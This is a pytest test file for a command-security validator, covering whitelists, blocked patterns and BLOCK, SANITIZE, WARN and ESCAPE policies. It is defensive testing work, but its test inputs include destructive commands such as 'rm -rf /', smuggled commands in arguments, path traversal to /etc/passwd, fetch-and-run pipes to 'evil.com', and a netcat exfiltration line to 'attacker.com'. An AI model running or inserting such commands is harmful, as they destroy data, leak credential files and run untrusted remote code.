"""Comprehensive tests for the new robust command security implementation.

Tests cover:
- CommandWhitelist functionality
- CommandValidator validation logic
- SecurityPolicy enforcement
- Different security levels
- Integration with SecurityValidator
"""

from __future__ import annotations

from unittest.mock import Mock, patch

import pytest

from importobot.services.security_types import SecurityLevel
from importobot.utils.command_security import (
    CommandValidationResult,
    CommandValidator,
    CommandWhitelist,
    SecurityPolicy,
    create_command_validator,
    get_safe_execution_allowed_commands,
    validate_command_safely,
)
from importobot.utils.security import SecurityValidator


class TestCommandWhitelist:
    """Test the CommandWhitelist class functionality."""

    def test_universally_safe_commands(self) -> None:
        """Test that universally safe commands are properly defined."""
        expected_safe = {
            "ls",
            "dir",
            "cd",
            "pwd",
            "file",
            "stat",
            "wc",
            "head",
            "tail",
            "cat",
            "grep",
            "sed",
            "awk",
            "sort",
            "uniq",
            "cut",
            "tar",
            "gzip",
            "gunzip",
            "zip",
            "unzip",
            "ping",
            "traceroute",
            "nslookup",
            "dig",
            "uname",
            "whoami",
            "id",
            "date",
            "uptime",
        }

        assert expected_safe == CommandWhitelist.UNIVERSALLY_SAFE_COMMANDS
        assert len(CommandWhitelist.UNIVERSALLY_SAFE_COMMANDS) > 0

    def test_development_commands(self) -> None:
        """Test development environment commands."""
        expected_dev = {
            "make",
            "cmake",
            "gcc",
            "g++",
            "python",
            "python3",
            "node",
            "npm",
            "git",
            "svn",
            "hg",
            "pytest",
            "jest",
            "mocha",
            "cargo test",
            "curl",
            "wget",
            "ssh",
            "scp",
            "rsync",
        }

        assert expected_dev == CommandWhitelist.DEVELOPMENT_COMMANDS
        assert len(CommandWhitelist.DEVELOPMENT_COMMANDS) > 0

    def test_production_commands(self) -> None:
        """Test production environment commands."""
        expected_prod = {
            "ps",
            "top",
            "htop",
            "df",
            "du",
            "free",
            "netstat",
            "systemctl status",
            "service status",
        }

        assert expected_prod == CommandWhitelist.PRODUCTION_COMMANDS
        assert len(CommandWhitelist.PRODUCTION_COMMANDS) > 0

    def test_blocked_patterns(self) -> None:
        """Test that dangerous patterns are properly defined."""
        patterns = CommandWhitelist.BLOCKED_PATTERNS

        # Test for file system destruction patterns
        assert any(pattern.search("rm -rf /") for pattern in patterns)
        assert any(pattern.search("dd if=/dev/zero") for pattern in patterns)
        assert any(pattern.search("mkfs.ext4") for pattern in patterns)

        # Test for command injection patterns
        assert any(pattern.search("$(cat /etc/passwd)") for pattern in patterns)
        assert any(pattern.search("`whoami`") for pattern in patterns)
        assert any(pattern.search("cat file | sh") for pattern in patterns)

    def test_get_allowed_commands_by_security_level(self) -> None:
        """Test getting allowed commands by security level."""
        # Permissive should have the most commands
        permissive_commands = CommandWhitelist.get_allowed_commands(
            SecurityLevel.PERMISSIVE
        )
        standard_commands = CommandWhitelist.get_allowed_commands(
            SecurityLevel.STANDARD
        )
        strict_commands = CommandWhitelist.get_allowed_commands(SecurityLevel.STRICT)

        assert len(permissive_commands) >= len(standard_commands)
        assert len(standard_commands) >= len(strict_commands)

        # All levels should include universally safe commands
        for cmd in CommandWhitelist.UNIVERSALLY_SAFE_COMMANDS:
            assert cmd in permissive_commands
            assert cmd in standard_commands
            assert cmd in strict_commands

    def test_is_command_allowed(self) -> None:
        """Test command allowance checking."""
        # Safe commands should be allowed
        assert CommandWhitelist.is_command_allowed("ls", SecurityLevel.STANDARD)
        assert CommandWhitelist.is_command_allowed("cat", SecurityLevel.STRICT)

        # Development commands should only be allowed in appropriate levels
        assert CommandWhitelist.is_command_allowed("git", SecurityLevel.PERMISSIVE)
        assert CommandWhitelist.is_command_allowed("git", SecurityLevel.STANDARD)
        assert not CommandWhitelist.is_command_allowed("git", SecurityLevel.STRICT)

        # Unsafe commands should never be allowed
        assert not CommandWhitelist.is_command_allowed(
            "rm -rf /", SecurityLevel.PERMISSIVE
        )
        assert not CommandWhitelist.is_command_allowed(
            "dd if=/dev/zero", SecurityLevel.STANDARD
        )

    def test_has_blocked_pattern(self) -> None:
        """Test blocked pattern detection."""
        # Dangerous commands should be detected
        has_blocked, pattern = CommandWhitelist.has_blocked_pattern("rm -rf /")
        assert has_blocked
        assert pattern is not None

        # Safe commands should not be detected
        has_blocked, pattern = CommandWhitelist.has_blocked_pattern("ls -la")
        assert not has_blocked
        assert pattern is None

        # Command injection should be detected
        has_blocked, pattern = CommandWhitelist.has_blocked_pattern("cat file | sh")
        assert has_blocked
        assert pattern is not None

    def test_has_suspicious_params(self) -> None:
        """Test suspicious parameter detection."""
        # Password parameters should be detected
        patterns = CommandWhitelist.has_suspicious_params(
            "curl http://example.com password=secret123"
        )
        assert len(patterns) > 0

        # API keys should be detected
        patterns = CommandWhitelist.has_suspicious_params(
            "wget http://api.example.com?token=abc123"
        )
        assert len(patterns) > 0

        # Path traversal should be detected
        patterns = CommandWhitelist.has_suspicious_params("cat ../../etc/passwd")
        assert len(patterns) > 0

        # Safe commands should have no suspicious patterns
        patterns = CommandWhitelist.has_suspicious_params("ls -la /home/user")
        assert len(patterns) == 0


class TestCommandValidator:
    """Test the CommandValidator class functionality."""

    def test_initialization(self) -> None:
        """Test CommandValidator initialization."""
        validator = CommandValidator(
            security_level=SecurityLevel.STANDARD, policy=SecurityPolicy.BLOCK
        )

        assert validator.security_level == SecurityLevel.STANDARD
        assert validator.policy == SecurityPolicy.BLOCK
        assert isinstance(validator.allowed_commands, set)
        assert len(validator.allowed_commands) > 0

    def test_custom_whitelist(self) -> None:
        """Test CommandValidator with custom whitelist."""
        custom_commands = {"custom_tool", "special_command"}
        validator = CommandValidator(
            security_level=SecurityLevel.STRICT, custom_whitelist=custom_commands
        )

        # Custom commands should be in allowed list
        for cmd in custom_commands:
            assert cmd in validator.allowed_commands

    def test_validate_safe_command(self) -> None:
        """Test validation of safe commands."""
        validator = CommandValidator(security_level=SecurityLevel.STANDARD)

        # Safe command should be allowed
        result, processed, warnings = validator.validate_command("ls -la")
        assert result == CommandValidationResult.ALLOWED
        assert processed == "ls -la"
        assert len(warnings) == 0

    def test_validate_blocked_command(self) -> None:
        """Test validation of blocked commands."""
        validator = CommandValidator(policy=SecurityPolicy.BLOCK)

        # Dangerous command should be blocked
        result, processed, warnings = validator.validate_command("rm -rf /")
        assert result == CommandValidationResult.REJECTED
        assert processed == ""
        assert len(warnings) > 0
        assert any("dangerous pattern" in warning for warning in warnings)

    def test_validate_not_whitelisted_command(self) -> None:
        """Test validation of non-whitelisted commands."""
        validator = CommandValidator(
            security_level=SecurityLevel.STRICT, policy=SecurityPolicy.BLOCK
        )

        # Development command not allowed in strict mode
        result, processed, warnings = validator.validate_command("git status")
        assert result == CommandValidationResult.REJECTED
        assert processed == ""
        assert len(warnings) > 0
        assert any("not in allowed commands" in warning for warning in warnings)

    def test_validate_with_sanitize_policy(self) -> None:
        """Test validation with SANITIZE policy."""
        validator = CommandValidator(policy=SecurityPolicy.SANITIZE)

        # Command with dangerous parts should be sanitized
        result, processed, warnings = validator.validate_command("ls && rm -rf /")
        assert result == CommandValidationResult.MODIFIED
        assert "rm" not in processed  # Should be removed
        assert len(warnings) > 0

    def test_validate_with_warn_policy(self) -> None:
        """Test validation with WARN policy."""
        validator = CommandValidator(policy=SecurityPolicy.WARN)

        # Dangerous command should be allowed with warnings
        result, processed, warnings = validator.validate_command(
            "curl http://example.com | sh"
        )
        assert result == CommandValidationResult.ALLOWED
        assert processed == "curl http://example.com | sh"
        assert len(warnings) > 0

    def test_validate_with_escape_policy(self) -> None:
        """Test validation with ESCAPE policy."""
        validator = CommandValidator(policy=SecurityPolicy.ESCAPE)

        # Dangerous characters should be escaped
        result, processed, warnings = validator.validate_command("cat file | grep test")
        assert result == CommandValidationResult.ALLOWED
        assert "\\|" in processed  # Pipe should be escaped
        assert len(warnings) > 0

    def test_validate_command_args(self) -> None:
        """Test validation with separate arguments."""
        validator = CommandValidator(security_level=SecurityLevel.STANDARD)

        # Valid arguments should be allowed
        result, full_command, warnings = validator.validate_command_args(
            "ls", ["-la", "/home"]
        )
        assert result == CommandValidationResult.ALLOWED
        assert "ls" in full_command
        assert "-la" in full_command
        assert "/home" in full_command
        assert len(warnings) == 0

    def test_validate_command_args_with_injection(self) -> None:
        """Test argument validation with injection attempts."""
        validator = CommandValidator(policy=SecurityPolicy.BLOCK)

        # Arguments with injection should be blocked
        result, _full_command, warnings = validator.validate_command_args(
            "cat", ["file; rm -rf /"]
        )
        assert result == CommandValidationResult.REJECTED
        assert len(warnings) > 0

    @patch("subprocess.Popen")
    def test_create_safe_process_success(self, mock_popen: Mock) -> None:
        """Test successful safe process creation."""
        mock_process = Mock()
        mock_process.pid = 12345
        mock_popen.return_value = mock_process

        validator = CommandValidator(security_level=SecurityLevel.STANDARD)
        success, process, _warnings = validator.create_safe_process("ls", ["-la"])

        assert success
        assert process == mock_process
        mock_popen.assert_called_once()

    @patch("subprocess.Popen")
    def test_create_safe_process_blocked(self, mock_popen: Mock) -> None:
        """Test blocked process creation."""
        validator = CommandValidator(policy=SecurityPolicy.BLOCK)
        success, process, warnings = validator.create_safe_process("rm", ["-rf", "/"])

        assert not success
        assert process is None
        assert len(warnings) > 0
        mock_popen.assert_not_called()

    def test_argument_validation(self) -> None:
        """Test individual argument validation."""
        validator = CommandValidator()

        # Safe arguments
        warnings = validator._validate_argument("filename.txt", 0)
        assert len(warnings) == 0

        # Arguments with injection characters
        warnings = validator._validate_argument("file; rm -rf /", 0)
        assert len(warnings) > 0
        assert any("injection character" in warning for warning in warnings)

    def test_argument_sanitization(self) -> None:
        """Test argument sanitization."""
        validator = CommandValidator()

        # Remove dangerous characters
        sanitized = validator._sanitize_argument("file;rm&echo test")
        assert ";" not in sanitized
        assert "&" not in sanitized
        assert "file" in sanitized

    def test_command_sanitization(self) -> None:
        """Test command sanitization."""
        validator = CommandValidator()

        # Remove dangerous patterns
        sanitized = validator._sanitize_command("cat file && rm -rf /")
        assert "rm" not in sanitized
        assert "cat file" in sanitized

    def test_legacy_escape_behavior(self) -> None:
        """Test legacy character escaping behavior."""
        validator = CommandValidator()

        # Escape dangerous characters
        escaped = validator._escape_dangerous_chars("cat file | grep test")
        assert "\\|" in escaped
        assert "cat file" in escaped


class TestSecurityIntegration:
    """Test integration with SecurityValidator."""

    def test_security_validator_with_new_command_security(self) -> None:
        """Test SecurityValidator integration with new command security."""
        # Test with BLOCK policy (default)
        validator = SecurityValidator(
            security_level=SecurityLevel.STANDARD,
            command_security_policy=SecurityPolicy.BLOCK,
        )

        # Safe command should work
        result = validator.sanitize_command_parameters("ls -la")
        assert result == "ls -la"

        # Dangerous command should be blocked
        result = validator.sanitize_command_parameters("rm -rf /")
        assert result == ""  # Empty string for rejected commands

    def test_security_validator_with_different_policies(self) -> None:
        """Test SecurityValidator with different security policies."""
        # Test with SANITIZE policy
        validator = SecurityValidator(command_security_policy=SecurityPolicy.SANITIZE)

        result = validator.sanitize_command_parameters("ls && rm -rf /")
        # Should be sanitized (rm removed) but not empty
        assert "ls" in result
        assert "rm" not in result

    def test_validate_command_for_execution(self) -> None:
        """Test the new validate_command_for_execution method."""
        validator = SecurityValidator(security_level=SecurityLevel.STANDARD)

        # Safe command should be allowed
        is_safe, _processed, warnings = validator.validate_command_for_execution(
            "ls", ["-la"]
        )
        assert is_safe
        assert len(warnings) == 0

    def test_validate_command_for_execution_with_args(self) -> None:
        """Test command validation with arguments."""
        validator = SecurityValidator()

        # Command with arguments
        is_safe, processed, _warnings = validator.validate_command_for_execution(
            "git", ["status", "--porcelain"]
        )
        assert is_safe
        assert "git" in processed

    def test_create_safe_subprocess(self) -> None:
        """Test the new create_safe_subprocess method."""
        validator = SecurityValidator()

        # Mock subprocess to avoid actual execution
        with patch("subprocess.Popen") as mock_popen:
            mock_process = Mock()
            mock_process.pid = 12345
            mock_popen.return_value = mock_process

            success, process, _warnings = validator.create_safe_subprocess(
                "ls", ["-la"]
            )

            assert success
            assert process == mock_process


class TestConvenienceFunctions:
    """Test convenience functions."""

    def test_create_command_validator(self) -> None:
        """Test create_command_validator convenience function."""
        validator = create_command_validator(
            security_level=SecurityLevel.STRICT, policy=SecurityPolicy.BLOCK
        )

        assert isinstance(validator, CommandValidator)
        assert validator.security_level == SecurityLevel.STRICT
        assert validator.policy == SecurityPolicy.BLOCK

    def test_validate_command_safely(self) -> None:
        """Test validate_command_safely convenience function."""
        # Safe command
        is_safe, processed, warnings = validate_command_safely(
            "ls -la", security_level=SecurityLevel.STANDARD
        )
        assert is_safe
        assert processed == "ls -la"
        assert len(warnings) == 0

        # Dangerous command with BLOCK policy
        is_safe, processed, warnings = validate_command_safely(
            "rm -rf /",
            security_level=SecurityLevel.STANDARD,
            policy=SecurityPolicy.BLOCK,
        )
        assert not is_safe
        assert processed == ""
        assert len(warnings) > 0

    def test_get_safe_execution_allowed_commands(self) -> None:
        """Test get_safe_execution_allowed_commands function."""
        commands = get_safe_execution_allowed_commands(SecurityLevel.STANDARD)

        assert isinstance(commands, set)
        assert len(commands) > 0
        assert "ls" in commands
        assert "cat" in commands


class TestEdgeCases:
    """Test edge cases and error conditions."""

    def test_empty_command(self) -> None:
        """Test validation of empty commands."""
        validator = CommandValidator()

        result, processed, warnings = validator.validate_command("")
        assert result == CommandValidationResult.ALLOWED
        assert processed == ""
        assert len(warnings) == 0

    def test_none_command(self) -> None:
        """Test validation of None commands."""
        validator = CommandValidator()

        result, processed, _warnings = validator.validate_command(None)
        assert result == CommandValidationResult.ALLOWED
        assert processed == "None"

    def test_very_long_command(self) -> None:
        """Test validation of very long commands."""
        validator = CommandValidator()
        long_cmd = "ls " + "a" * 10000

        result, processed, _warnings = validator.validate_command(long_cmd)
        assert result == CommandValidationResult.ALLOWED
        assert len(processed) > 0

    def test_unicode_in_command(self) -> None:
        """Test validation of commands with Unicode characters."""
        validator = CommandValidator()

        result, processed, _warnings = validator.validate_command("ls 📁 documents")
        assert result == CommandValidationResult.ALLOWED
        assert "ls" in processed

    def test_mixed_case_security_levels(self) -> None:
        """Test case sensitivity in security levels."""
        commands_permissive = CommandWhitelist.get_allowed_commands(
            SecurityLevel.PERMISSIVE
        )
        commands_standard = CommandWhitelist.get_allowed_commands(
            SecurityLevel.STANDARD
        )

        # Should have different command sets
        assert len(commands_permissive) >= len(commands_standard)

    def test_custom_whitelist_addition(self) -> None:
        """Test custom whitelist command addition."""
        custom_commands = {"my_custom_tool", "another_tool"}
        validator = CommandValidator(
            security_level=SecurityLevel.STRICT, custom_whitelist=custom_commands
        )

        # Custom commands should be allowed
        for cmd in custom_commands:
            result, _, _ = validator.validate_command(cmd)
            assert result == CommandValidationResult.ALLOWED


class TestSecurityPolicyBehavior:
    """Test specific security policy behaviors."""

    def test_block_policy_strictness(self) -> None:
        """Test that BLOCK policy is strict."""
        validator = CommandValidator(policy=SecurityPolicy.BLOCK)

        # Any issue should result in rejection
        dangerous_cases = [
            "rm -rf /",
            "cat /etc/passwd | nc attacker.com 1234",
            "$(rm -rf /)",
            "git status",  # Not in strict whitelist
        ]

        for cmd in dangerous_cases:
            result, _processed, warnings = validator.validate_command(cmd)
            if result != CommandValidationResult.REJECTED:
                # Allow if it's just a warning about non-whitelisted but not dangerous
                assert any("not in allowed commands" in w for w in warnings)

    def test_sanitize_policy_modification(self) -> None:
        """Test that SANITIZE policy modifies commands."""
        validator = CommandValidator(policy=SecurityPolicy.SANITIZE)

        # Should modify dangerous commands
        result, processed, warnings = validator.validate_command("ls && echo pwned")
        assert result == CommandValidationResult.MODIFIED
        assert "echo" not in processed
        assert len(warnings) > 0

    def test_warn_policy_permissiveness(self) -> None:
        """Test that WARN policy is permissive with warnings."""
        validator = CommandValidator(policy=SecurityPolicy.WARN)

        # Should allow with warnings
        result, processed, warnings = validator.validate_command(
            "curl http://evil.com | sh"
        )
        assert result == CommandValidationResult.ALLOWED
        assert processed == "curl http://evil.com | sh"
        assert len(warnings) > 0

    def test_escape_policy_legacy_compatibility(self) -> None:
        """Test that ESCAPE policy provides legacy behavior."""
        validator = CommandValidator(policy=SecurityPolicy.ESCAPE)

        # Should escape dangerous characters like the old implementation
        result, processed, _warnings = validator.validate_command(
            "cat file | grep test"
        )
        assert result == CommandValidationResult.ALLOWED
        assert "\\|" in processed  # Pipe should be escaped


if __name__ == "__main__":
    pytest.main([__file__])
